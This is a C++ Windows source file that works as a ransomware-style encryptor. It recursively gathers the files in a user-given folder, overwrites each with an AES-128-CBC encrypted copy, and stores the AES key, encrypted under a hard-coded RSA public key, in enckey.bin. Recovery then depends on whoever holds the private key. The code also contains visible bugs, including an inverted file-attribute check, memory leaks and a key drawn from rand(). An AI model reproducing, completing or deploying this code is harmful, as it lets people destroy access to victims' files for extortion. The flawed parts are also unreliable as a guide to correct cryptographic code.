#include <iostream>
#include <vector>
#include <string>
#include <array>
#include <windows.h>
#include <bcrypt.h>

#pragma comment (lib, "bcrypt.lib")
#pragma comment (lib, "kernel32.lib")

// Checks the status returned from WinAPI functions. Negative status is an error.
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// return code status
enum ReturnCode { SUCCESS = 0, FAILED = 1 };

// Both Key and Initialization vector lengths of AES-128-CBC are 16bytes/128bits long. 
constexpr int KEY_LENGTH = 16;
constexpr int IV_LENGTH = 16;

// Public key of RSA algorithm.
 BYTE PublicKey[] = {
		0x52, 0x53, 0x41, 0x31, 0x00, 0x04, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x80, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0xB7,
		0x50, 0x52, 0xDD, 0x58, 0xE4, 0x96, 0xAF, 0x91, 0xE5, 0xB2, 0x7B, 0x0A, 0xE6, 0xAA,
		0x1F, 0x71, 0x8A, 0x66, 0xC3, 0xF0, 0x21, 0xD8, 0xE6, 0x2C, 0xD6, 0x25, 0x2E, 0x77,
		0x3C, 0x61, 0x08, 0x1B, 0x69, 0xE7, 0x58, 0xDF, 0x3B, 0x07, 0xFE, 0xF1, 0xDB, 0xBF,
		0xA6, 0x35, 0xDF, 0xC7, 0x49, 0x06, 0xC8, 0xDB, 0x74, 0x2A, 0xB9, 0xED, 0xB3, 0x04,
		0x80, 0x75, 0x5F, 0x71, 0x2C, 0xD0, 0x14, 0x0E, 0x81, 0x18, 0x00, 0x5E, 0x34, 0x5A,
		0xC2, 0x3A, 0x84, 0x63, 0xB1, 0x6B, 0x04, 0x21, 0x49, 0x7F, 0xE0, 0xF3, 0x52, 0x5E,
		0x61, 0x43, 0xB1, 0x8F, 0x7C, 0xF2, 0x74, 0x29, 0x28, 0x69, 0x20, 0x36, 0xC0, 0x92,
		0x17, 0x42, 0x99, 0x72, 0xE5, 0xE7, 0x82, 0xBE, 0x8E, 0x3B, 0x3F, 0xC9, 0x0A, 0xE1,
		0xC4, 0x63, 0x68, 0x73, 0x1D, 0x67, 0x8D, 0xC0, 0xA3, 0xB4, 0xBA, 0xF0, 0xB7, 0xB0, 0x9B };


/* Functions Signatures */

ReturnCode getPathInput(std::string& path);

// Recursively get all files in given directory path.
ReturnCode getAllFilesFromPath(std::vector<std::string>& filesList,
			       const std::string path);

ReturnCode generateRandomSymmetricKey(std::array<BYTE, KEY_LENGTH>& key);

// Opens AES algorithm provider and sets it CBC mode.
ReturnCode initializeAesAlgorithm(BCRYPT_ALG_HANDLE& hAesAlg);

// performs encryption for each file in files list using input AES key and initialization vector.
ReturnCode encryptFiles(const std::vector<std::string>& filesList,
			std::array<BYTE, KEY_LENGTH>& aes128key,
			std::array<BYTE, IV_LENGTH>& aesIV);

// performs encryption of the symmetric key, saving it in "enckey.bin" file.
ReturnCode encryptSymmetricKeyInFile(std::array<BYTE, KEY_LENGTH>& aes128key,
				     const std::string& path,
				     const std::string& encryptedKeyFileName);

int main() {

	std::string			path; // input directory path. 

	std::vector<std::string>	filesList; // all files in the input directory and its subdirectories.

	std::array<BYTE, KEY_LENGTH>	key = { 0 }; // AES symmetric key.

	const std::string		encryptedKeyFileName = "enckey.bin"; // file name of encrypted symmetric key.
	
	std::array<BYTE, IV_LENGTH> IV = { 0x00, 0x01, 0x02, 0x03,
				  	   0x04, 0x05, 0x06, 0x07,
				   	   0x08, 0x09, 0x0A, 0x0B,
				    	   0x0C, 0x0D, 0x0E, 0x0F }; // Can be changed to input IV.
	
	if  (ReturnCode::FAILED == getPathInput(path)) {
		std::cerr << "<ERROR> Input path is not a directory.\n";
		return ReturnCode::FAILED;
	}

	if (ReturnCode::FAILED == getAllFilesFromPath(filesList, path)) {
		std::cerr << "<ERROR> Cannot get files from path.\n";
		return ReturnCode::FAILED;
	}

	if (ReturnCode::FAILED == generateRandomSymmetricKey(key)) {
		std::cerr << "<ERROR> Failed to generate random AES symmetric key.\n";
		return ReturnCode::FAILED;
	}

	if (ReturnCode::FAILED == encryptFiles(filesList, key, IV)) {
		std::cerr << "<ERROR> Failed to encrypt files.\n";
		return ReturnCode::FAILED;
	} 

	if (ReturnCode::FAILED == encryptSymmetricKeyInFile(key, path, encryptedKeyFileName)) {
		std::cerr << "<ERROR> Failed to encrypt symmetric key in file.\n";
		return ReturnCode::FAILED;
	}

	SecureZeroMemory(key.data(), key.size());

	return ReturnCode::SUCCESS;
}

ReturnCode getPathInput(std::string& path) {

	std::cout << "Please enter folder path >> ";
	std::getline(std::cin, path);

	if (GetFileAttributesA(path.c_str()) == FILE_ATTRIBUTE_DIRECTORY) {
		return ReturnCode::SUCCESS;
	}
	return ReturnCode::FAILED;
}

ReturnCode getAllFilesFromPath(std::vector<std::string>& filesList,
			       const std::string path) {

	std::string		currentFilePath; // the current file with its full path for storing in files list.
	std::string		newPath = path + "\\*"; // adds suffix for all files under the chosen directory.
	LPCSTR			convertedRootPath = newPath.c_str(); // convert of the path into LPCSTR.
	LPCSTR			convertedCurrentFilePath; // represents the current file's full path.
	DWORD			dwFileAttributes = 0;
	WIN32_FIND_DATAA	data; // a struct for file's data.
	HANDLE			hFind = FindFirstFileA(convertedRootPath, &data); // gets the first file in the given path.

	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (strcmp(data.cFileName, ".") != 0 &&
			    strcmp(data.cFileName, "..") != 0) { // ignore current and previous direcories.

				currentFilePath = path + "\\" + data.cFileName;

				convertedCurrentFilePath = currentFilePath.c_str();
				
				dwFileAttributes = GetFileAttributesA(convertedCurrentFilePath);
				
				if (dwFileAttributes == INVALID_FILE_ATTRIBUTES){
					if (dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
						getAllFilesFromPath(filesList, currentFilePath); // call recursively to get all subdirectories files.
					}
					else {
						filesList.push_back(currentFilePath); // add the file to the list.
					}
				}
				else {
					std::cerr << "<ERROR> Invalid file attributes.\n";
				}
			}
		} while (FindNextFileA(hFind, &data)); // keep loop till no more files in the path.

		FindClose(hFind);
	}
	else { // prints error if cannot reach the directory
		std::cout << "<ERROR> Failed to get directory's data." << std::endl;
		return ReturnCode::FAILED;
	}
	return ReturnCode::SUCCESS;
}

ReturnCode generateRandomSymmetricKey(std::array<BYTE, KEY_LENGTH>& key) {

	for (int i = 0; i < KEY_LENGTH; i++) {
		key.at(i) = (BYTE)std::rand() % 256;
	}
	return ReturnCode::SUCCESS;
}

ReturnCode initializeAesAlgorithm(BCRYPT_ALG_HANDLE& hAesAlg) {

	NTSTATUS	status = 0; // contains the status returned from WinAPI functions.

	// get the AES algorithm handler.
	if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(&hAesAlg,
							     BCRYPT_AES_ALGORITHM,
							     NULL,
							     0))) {
		std::cerr << "<ERROR> Failed to open algorithm provider." << std::endl;
		return ReturnCode::FAILED;
	}

	// sets the AES algorithm chaining mode to CBC.
	if (!NT_SUCCESS(status = BCryptSetProperty(hAesAlg,
						   BCRYPT_CHAINING_MODE,
						   (PBYTE)BCRYPT_CHAIN_MODE_CBC,
						   sizeof(BCRYPT_CHAIN_MODE_CBC),
						   0))) {
		std::cerr << "<ERROR> Failed to set CBC chaining mode to AES algorithm.\n";
		return ReturnCode::FAILED;
	}

	return ReturnCode::SUCCESS;
}

ReturnCode encryptFiles(const std::vector<std::string>& filesList,
			std::array<BYTE, KEY_LENGTH>& aes128Key,
			std::array<BYTE, IV_LENGTH>& aesIV) {

	BCRYPT_ALG_HANDLE   hAesAlg = NULL; // encryption algorithm handler.

	BCRYPT_KEY_HANDLE   hKey = NULL; // key handler.

	HANDLE              hFileRead = NULL, // read from file handler.
			    hFileWrite = NULL; // write to file handler.

	NTSTATUS            status = 0; // returned status from WinAPI functions.

	ReturnCode	   returnCode = ReturnCode::SUCCESS;

	PBYTE               pbCipherText = NULL,
			    pbPlainText = NULL,
		  	    pbKeyObject = NULL,
			    pbIV = NULL,
			    pbFileBuffer = NULL;

	LPCSTR              lpFileToEncrypt = NULL;

	DWORD               cbCipherText = 0,
			    cbPlainText = 0,
	     		    cbData = 0,
			    cbKeyObject = 0,
			    cbBlockLen = 0,
			    dwNumOfBytesWritten = 0,
		   	    dwBytesRead = 0,
			    cbFileSize = 0;

	LARGE_INTEGER       lFileSize = { 0 };

	if (ReturnCode::SUCCESS != initializeAesAlgorithm(hAesAlg)) {
		std::cerr << "<ERROR> Faild to initialize AES algorithm.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// get the key object length from AES algorithm into cbKeyObject.
	if (!NT_SUCCESS(status = BCryptGetProperty(hAesAlg,
						   BCRYPT_OBJECT_LENGTH,
						   (PBYTE)&cbKeyObject,
						   sizeof(DWORD),
						   &cbData,
						   0))) {
		std::cerr << "<ERROR> Faild to get key object length.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// allocates memory in the heap for the key object by cbKeyObject size.
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(),
				       HEAP_ZERO_MEMORY,
				       cbKeyObject);

	if (NULL == pbKeyObject) {
		std::cerr << "<ERROR> Failed to allocate memory on the heap.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// get the block length from AES algorithm into cbBlockLen.
	if (!NT_SUCCESS(status = BCryptGetProperty(hAesAlg,
						   BCRYPT_BLOCK_LENGTH,
						   (PBYTE)&cbBlockLen,
						   sizeof(DWORD),
						   &cbData,
						   0))) {
		std::cerr << "<ERROR> Failed to get block length.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// Checks if the block length is longer than the IV length.
	if (cbBlockLen > aesIV.size()) {
		std::cerr << "<ERROR> Block length is longer than IV length.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// Allocate a buffer for the IV as the size of a block.
	pbIV = (PBYTE)HeapAlloc(GetProcessHeap(),
				HEAP_ZERO_MEMORY,
				cbBlockLen);

	if (NULL == pbIV) {
		std::cerr << "<ERROR> Failed to allocate memory on the heap.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// copies the data from AesIV into pbIV.
	memcpy_s(pbIV,
		 cbBlockLen,
		 aesIV.data(),
		 aesIV.size());

	// Generate the key from supplied input key bytes.
	if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(hAesAlg,
							    &hKey,
							    pbKeyObject,
							    cbKeyObject,
							    (PBYTE)aes128Key.data(),
							    aes128Key.size(),
							    0))) {
		std::cerr << "<ERROR> Faild to generate a symmetric key.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// loop through the files list to encrypt each file with the symmetric key.
	for (auto& file : filesList) {

		lpFileToEncrypt = file.c_str(); // convert string to LPCSTR.

		hFileRead = CreateFileA(lpFileToEncrypt,
					GENERIC_READ,
					0,
					NULL,
					OPEN_EXISTING,
					FILE_ATTRIBUTE_NORMAL,
					NULL);

		if (hFileRead == INVALID_HANDLE_VALUE) {
			std::cerr << "<ERROR> Failed to open file : " << file << "\n";
			continue;
		}

		cbFileSize = GetFileSizeEx(hFileRead, &lFileSize); // get the file size into lFileSize.

		if (!cbFileSize) {
			std::cerr << "<ERROR> Failed to get size of file : " << file << "\n";
			CloseHandle(hFileRead);
			continue;
		}

		// creates a file buffer with the file size.
		pbFileBuffer = (PBYTE)HeapAlloc(GetProcessHeap(),
						HEAP_ZERO_MEMORY,
						(SIZE_T)lFileSize.QuadPart);

		if (pbFileBuffer == NULL) {
			std::cerr << "<ERROR> Failed to allocate memory for file : " << file << "\n";
			continue;
		}

		// reads the input file into the file buffer.
		if (!ReadFile(hFileRead,
			      pbFileBuffer,
			      (DWORD)lFileSize.QuadPart,
			      &dwBytesRead,
			      NULL)) {
			std::cerr << "<ERROR> Failed to read content of file : " << file << "\n";
			continue;
		}

		CloseHandle(hFileRead);

		// sets the number of bytes read to the size of plain text.
		cbPlainText = dwBytesRead;

		// allocate memory in the heap for the plain text.
		pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(),
					       HEAP_ZERO_MEMORY,
					       cbPlainText);

		if (NULL == pbPlainText) {
			std::cerr << "<ERROR> Failed to allocate temporary memory for file : " << file << "\n";
			continue;
		}

		// copies the file data into pbPlainText
		memcpy_s(pbPlainText,
			 cbPlainText,
			 pbFileBuffer,
			 dwBytesRead);

		// Get the needed buffer size.
		if (!NT_SUCCESS(status = BCryptEncrypt(hKey,
						       pbPlainText,
						       cbPlainText,
						       NULL,
						       pbIV,
						       cbBlockLen,
						       NULL,
						       0,
						       &cbCipherText,
						       BCRYPT_BLOCK_PADDING))) {
			std::cerr << "<ERROR> Failed to get the cipher buffer size for file : " << file << "\n";
			continue;
		}

		// allocate memory in the heap for the encrypted data.
		pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(),
						HEAP_ZERO_MEMORY,
						cbCipherText);

		if (NULL == pbCipherText) {
			std::cerr << "<ERROR> Failed to allocate memory for cipher text for file : " << file << "\n";
			continue;
		}

		// Use the key to encrypt the plaintext buffer.
		// For block sized messages, block padding will add an extra block.
		if (!NT_SUCCESS(status = BCryptEncrypt(hKey,
						       pbPlainText,
						       cbPlainText,
						       NULL,
						       pbIV,
						       cbBlockLen,
						       pbCipherText,
						       cbCipherText,
						       &cbCipherText,
						       BCRYPT_BLOCK_PADDING))) {
			std::cerr << "<ERROR> Failed to perform encryption for file : " << file << "\n";
			continue;
		}

		hFileWrite = CreateFileA(lpFileToEncrypt,
					 GENERIC_WRITE,
					 0,
					 NULL,
					 CREATE_ALWAYS,
					 FILE_ATTRIBUTE_NORMAL,
					 NULL);

		if (hFileWrite == INVALID_HANDLE_VALUE) {
			std::cerr << "<ERROR> Failed to open file : " << file << "\n";
			continue;
		}

		dwNumOfBytesWritten = 0; // initialize number of bytes written to file.

		if (!WriteFile(hFileWrite,
			       pbCipherText,
			       cbCipherText,
			       &dwNumOfBytesWritten,
			       NULL)) {
			std::cerr << "<ERROR> Failed to write content to file : " << file << "\n";
			CloseHandle(hFileWrite);
			continue;
		}

		CloseHandle(hFileWrite);

		if (pbFileBuffer != NULL) {
			HeapFree(GetProcessHeap(), 0, pbFileBuffer); // frees the allocated memory.
		}

		returnCode = ReturnCode::SUCCESS;
	}

Cleanup:

	if (hAesAlg) {
		BCryptCloseAlgorithmProvider(hAesAlg, 0);
	}

	if (hKey) {
		BCryptDestroyKey(hKey);
	}

	if (pbCipherText) {
		HeapFree(GetProcessHeap(), 0, pbCipherText);
	}

	if (pbPlainText) {
		HeapFree(GetProcessHeap(), 0, pbPlainText);
	}

	if (pbKeyObject) {
		HeapFree(GetProcessHeap(), 0, pbKeyObject);
	}

	if (pbIV) {
		HeapFree(GetProcessHeap(), 0, pbIV);
	}

	return returnCode;
}

ReturnCode encryptSymmetricKeyInFile(std::array<BYTE, KEY_LENGTH>& aes128key,
				     const std::string& path,
				     const std::string& encryptedKeyFileName) {

	BCRYPT_ALG_HANDLE	hRsaAlg = NULL;

	BCRYPT_KEY_HANDLE	hKey = NULL;

	HANDLE			hFileWrite = NULL;

	NTSTATUS		status = 0;

	ReturnCode		returnCode = ReturnCode::SUCCESS;

	PBYTE	               	pbEncryptedBuffer = NULL,
				pbDecryptedBuffer = NULL;

	DWORD			cbEncryptedBuffer = 0,
				cbDecryptedBuffer = 0,
				dwNumOfBytesWritten = 0;


	std::string encryptedSymmetricKeyPath = "";
	encryptedSymmetricKeyPath = path + "\\" + encryptedKeyFileName;

	if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(&hRsaAlg,
							     BCRYPT_RSA_ALGORITHM,
							     NULL,
						 	     0))) {
		std::cerr << "<ERROR> Failed to open algorithm provider.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	if (!NT_SUCCESS(status = BCryptImportKeyPair(hRsaAlg,
						     NULL,
						     BCRYPT_RSAPUBLIC_BLOB,
						     &hKey,
					 	     PublicKey,
						     sizeof(PublicKey),
						     BCRYPT_NO_KEY_VALIDATION))) {
		std::cerr << "<ERROR> Failed to import public key.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	if (!NT_SUCCESS(status = BCryptEncrypt(hKey,
					       aes128key.data(),
					       KEY_LENGTH,
					       NULL,
					       NULL,
					       0,
					       NULL,
					       0,
					       &cbEncryptedBuffer,
					       BCRYPT_PAD_PKCS1))) {
		std::cerr << "<ERROR> Failed to encrypt the key.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	pbEncryptedBuffer = (PBYTE)HeapAlloc(GetProcessHeap(),
					     HEAP_ZERO_MEMORY,
					     cbEncryptedBuffer);

	if (pbEncryptedBuffer == NULL) {
		std::cerr << "<ERROR> Failed to allocate memory on the heap.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	if (!NT_SUCCESS(status = BCryptEncrypt(hKey,
					       aes128key.data(),
					       KEY_LENGTH,
					       NULL,
					       NULL,
					       0,
					       pbEncryptedBuffer,
					       cbEncryptedBuffer,
					       &cbEncryptedBuffer,
					       BCRYPT_PAD_PKCS1))) {
		std::cerr << "<ERROR> Failed to encrypt the symmetric key.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}
	
	// Creates file in the path named enckey.bin
	hFileWrite = CreateFileA(encryptedSymmetricKeyPath.c_str(),
				 GENERIC_WRITE,
				 0,
			 	 NULL,
				 CREATE_ALWAYS,
		 		 FILE_ATTRIBUTE_NORMAL,
				 NULL);

	if (hFileWrite == INVALID_HANDLE_VALUE) {
		std::cerr << "<ERROR> Failed to open file in path : " << encryptedSymmetricKeyPath << "\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	if (!WriteFile(hFileWrite,
		       pbEncryptedBuffer,
		       cbEncryptedBuffer,
		       &dwNumOfBytesWritten,
		       NULL)) {
		std::cerr << "<ERROR> Failed to write content to file : " << encryptedSymmetricKeyPath << "\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	CloseHandle(hFileWrite);

Cleanup:
	if (hKey) {
		BCryptDestroyKey(hKey);
	}
	if (hRsaAlg) {
		BCryptCloseAlgorithmProvider(hRsaAlg, 0);
	}
	if (pbEncryptedBuffer) {
		HeapFree(GetProcessHeap(), 0, pbEncryptedBuffer);
	}
	if (pbDecryptedBuffer) {
		HeapFree(GetProcessHeap(), 0, pbDecryptedBuffer);
	}

	return returnCode;
}
